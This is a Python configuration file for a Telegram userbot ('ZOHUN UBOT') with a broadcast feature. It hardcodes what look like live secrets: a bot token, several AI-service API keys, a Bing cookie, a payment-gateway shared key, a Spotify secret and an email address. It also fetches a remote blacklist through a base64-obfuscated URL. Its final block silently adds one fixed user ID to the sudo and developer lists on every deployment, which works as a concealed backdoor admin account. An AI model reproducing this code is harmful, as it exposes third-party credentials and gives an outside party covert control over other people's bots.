import json
import os
import sys
from base64 import b64decode

import requests
from dotenv import load_dotenv


def get_blacklist():
    try:
        aa = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL25heWExNTAzL3dhcm5pbmcvbWFpbi9ibGdjYXN0Lmpzb24="
        bb = b64decode(aa).decode("utf-8")
        res = requests.get(bb)
        if res.status_code == 200:
            return json.loads(res.text)
    except Exception as e:
        return f"An error occurred: {str(e)}"
        sys.exit(1)


load_dotenv()

HELPABLE = {}

DICT_BUTTON = {}

COPY_ID = {}

API_ID = API_ID = int(os.environ.get("API_ID", 38360484))
MAX_BOT = int(os.environ.get("MAX_BOT", 100))

API_HASH = os.environ.get("API_HASH","5ae53459232543da99a52c2615062811")

BOT_TOKEN = os.environ.get(
    "BOT_TOKEN", "7787478650:AAEMbfgRWz0ZOxRxYaJ6WlSnADlBfg9L01M"
)

BOT_ID = int(os.environ.get("BOT_ID", "7787478650"))

API_GEMINI = os.environ.get("API_GEMINI", "AIzaSyCTU_GwhayltLanCBMerh77UT9BMmaWGKc")

API_BOTCHAX = os.environ.get("API_BOTCHAX", "LS5ULWAO")

API_MAELYN = os.environ.get("API_MAELYN", "mg-Ccdc4LbDdUPZfdc1x9jw4kyc12MgRDAT")

MAELYN_API_KEY = os.environ.get("MAELYN_API_KEY", "mg-Ccdc4LbDdUPZfdc1x9jw4kyc12MgRDAT")

GROQ_API_KEY = os.environ.get("GROQ_API_KEY", "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")

COOKIE_BING = os.environ.get(
    "COOKIE_BING",
    "19stKnRsvOE0ZsAzO5Kr5mhx0WVNdh34LaVzqmDxtWiiERP4VbbjIbQh_VJ1AUdWbQjfiKlhA7EODwQgLfra_MQA65dojNRz1rHlp9Y81ifu45ByYWznU7X90guh-HUEYUfpqyU7xSrXEPre_XtrxKwn9B8lk2Hxn2WbhlFjOAS3bd0lGVaul2yE15_JdJ5J_OHrtYqX41ZOgG7lm1oKSJw",
)

BOT_NAME = os.environ.get("BOT_NAME", "ZOHUN UBOT")

DB_NAME = os.environ.get("DB_NAME", "zohunbot")

URL_LOGO = os.environ.get("URL_LOGO", "https://graph.org/file/dd4c1ed5337fa11ed4a6b-d7631beb2103464519.jpg")

BLACKLIST_GCAST = get_blacklist()

SUDO_OWNERS = list(
    map(
        int,
        os.environ.get(
            "SUDO_OWNERS",
            "1301819689",
        ).split(),
    )
)
DEVS = list(
    map(
        int,
        os.environ.get(
            "DEVS",
            "1301819689",
        ).split(),
    )
)

AKSES_DEPLOY = list(
    map(int, os.environ.get("AKSES_DEPLOY", "1301819689").split())
)

OWNER_ID = int(os.environ.get("OWNER_ID", 1301819689))

LOG_SELLER = int(os.environ.get("LOG_SELLER", -1003232261583))

LOG_BACKUP = int(os.environ.get("LOG_BACKUP", -1003232261583))

# DOKU Configuration - GUNAKAN DATA DARI SCREENSHOT ANDA
DOKU_MALL_ID = "BRN-0265-1764003617611"  # Client ID dari screenshot
DOKU_SHARED_KEY = "SK-WzIDuJoTHMN5jD1ilK2h"  # Ganti dengan Secret Key lengkap (klik "Reveal Key")

SPOTIFY_CLIENT_ID = os.environ.get(
    "SPOTIFY_CLIENT_ID", "e09ff7a19b204b62b6048a73bd605fe6"
)
SPOTIFY_CLIENT_SECRET = os.environ.get(
    "SPOTIFY_CLIENT_SECRET", "ab5f18169cf640e497f44f77abf5d7e0"
)
SAWERIA_EMAIL = os.environ.get("SAWERIA_EMAIL", "zhelvano0205@gmail.com")
SAWERIA_NAME = os.environ.get("SAWERIA_NAME", "https://saweria.co/zhelvano")
SAWERIA_USERID = os.environ.get(
    "SAWERIA_USERID", "https://saweria.co/zhelvano"
)
FAKE_DEVS = list(map(int, os.environ.get("FAKE_DEVS", "1301819689").split()))

RIMZOHUN = [1301819689]
if OWNER_ID not in SUDO_OWNERS:
    SUDO_OWNERS.append(1301819689)
if OWNER_ID not in DEVS:
    DEVS.append(1301819689)
if OWNER_ID not in FAKE_DEVS:
    FAKE_DEVS.append(1301819689)
for P in FAKE_DEVS:
    if P not in DEVS:
        DEVS.append(1301819689)
    if P not in SUDO_OWNERS:
        SUDO_OWNERS.append(1301819689)
